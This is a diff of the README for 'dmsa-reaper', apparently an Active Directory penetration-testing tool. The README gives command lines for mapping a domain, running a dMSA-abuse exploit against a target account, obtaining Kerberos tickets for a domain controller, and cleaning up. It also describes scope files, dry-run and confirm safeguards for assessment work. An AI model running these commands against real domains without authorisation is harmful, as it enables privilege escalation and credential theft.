@@ -11,102 +11,68 @@ python3 -m venv .venv
 pip install .
 ```
 
-## Quick start
-
-Map the domain:
-
-```bash
-dmsa-reaper map \
-  -d corp.local --dc-ip 10.0.0.10 \
-  -u analyst -p 'pass' --use-ldaps
-```
-
-List modern executable paths. Add `--legacy` when assessing an unpatched
-domain controller:
-
-```bash
-dmsa-reaper paths --state state.json
-```
-
-LDAP writes use a small scope file. For example:
-
-```json
-{
-  "domain": "corp.local",
-  "allowedOUs": [
-    "OU=Service Accounts,DC=corp,DC=local"
-  ],
-  "allowedTargets": [
-    "CN=target,CN=Users,DC=corp,DC=local"
-  ],
-  "allowDaclPrimitives": false,
-  "requireConfirmString": false
-}
-```
-
-Preview a selected path:
+## Exploit a known target
 
 ```bash
 dmsa-reaper exploit \
-  --state state.json --path BS-7f31... \
-  --scope scope.json --dry-run
-```
+  -d corp.local --dc-ip 10.0.0.10 -u analyst -p 'pass' --use-ldaps \
+  --target victim --dry-run
 
-Execute it with the same account and domain controller used for mapping:
-
-```bash
 dmsa-reaper exploit \
-  --state state.json --path BS-7f31... \
-  --scope scope.json --confirm \
-  -d corp.local --dc-ip 10.0.0.10 \
-  -u analyst -p 'pass' --use-ldaps
+  -d corp.local --dc-ip 10.0.0.10 -u analyst -p 'pass' --use-ldaps \
+  --target victim --confirm
 ```
 
-The command prints an operation ID. Use it to acquire the dMSA TGT:
+`--target` maps just that account and runs the path if there's exactly one.
+Multiple paths: narrow with `--path`, `--primitive`, or `--container-dn`.
+
+## Recon a domain first
 
 ```bash
-dmsa-reaper tgt \
-  --op OP-YYYYMMDD-deadbeef \
-  --ccache /secure/operator.ccache \
-  --identity analyst
+dmsa-reaper map -d corp.local --dc-ip 10.0.0.10 -u analyst -p 'pass' --use-ldaps
+
+dmsa-reaper paths --state state.json          # --legacy for unpatched DCs
+
+dmsa-reaper exploit --state state.json --path BS-7f31... --dry-run
+
+dmsa-reaper exploit --state state.json --path BS-7f31... --confirm \
+  -d corp.local --dc-ip 10.0.0.10 -u analyst -p 'pass' --use-ldaps   # same account/DC as map
 ```
 
-Or acquire the TGT and a service ticket together:
+## Tickets
+
+Either form prints an operation ID.
 
 ```bash
-dmsa-reaper ticket \
-  --op OP-YYYYMMDD-deadbeef \
-  --ccache /secure/operator.ccache \
-  --identity analyst \
+dmsa-reaper tgt --op OP-YYYYMMDD-deadbeef \
+  --ccache /secure/operator.ccache --identity analyst
+
+dmsa-reaper ticket --op OP-YYYYMMDD-deadbeef \
+  --ccache /secure/operator.ccache --identity analyst \
   --spn cifs/dc01.corp.local
 ```
 
-Ticket artifacts are written under `.reaper/runs/<operation-id>/`; each SPN
-gets its own cache and handoff script.
+Artifacts land under `.reaper/runs/<operation-id>/`; each SPN gets its own
+cache and handoff script.
 
-Remove the LDAP changes recorded by the operation:
+## Cleanup
 
 ```bash
-dmsa-reaper cleanup \
-  --op OP-YYYYMMDD-deadbeef \
-  -u analyst -p 'pass' --use-ldaps
+dmsa-reaper cleanup --op OP-YYYYMMDD-deadbeef -u analyst -p 'pass' --use-ldaps
 ```
 
-## Kerberos LDAP authentication
+Restores an attribute only while it still holds the operation's value, removes
+only the ACEs the operation added, deletes a created object only if its
+`objectGUID` still matches the journal. Conflicts are left untouched and exit
+non-zero. Journals live in `.reaper/operations`.
 
-Set `KRB5CCNAME`, pass `-k`, and still provide the account name so the tool can
-match the live identity to the mapped SID:
+## Kerberos
 
 ```bash
 export KRB5CCNAME=/secure/operator.ccache
 dmsa-reaper map -d corp.local --dc-ip 10.0.0.10 -u analyst -k
 ```
 
-Password-based NTLM, LDAPS, STARTTLS, and ccache-based SASL/GSSAPI are
-supported for LDAP. Pass-the-hash, AES keys, and keytabs are not supported
-consistently by the LDAP path.
-
-Operation journals live in `.reaper/operations`. Cleanup restores an attribute
-only while it still contains the operation's value, removes only ACEs inserted
-by that operation, and deletes a created object only when its `objectGUID`
-matches the journal. Conflicts are left untouched and return a non-zero exit.
+Pass `-u` with `-k` so the tool can match the ccache identity to the mapped
+SID. NTLM, LDAPS, STARTTLS, and ccache SASL/GSSAPI work for LDAP; pass-the-hash,
+AES keys, and keytabs aren't consistently supported there.
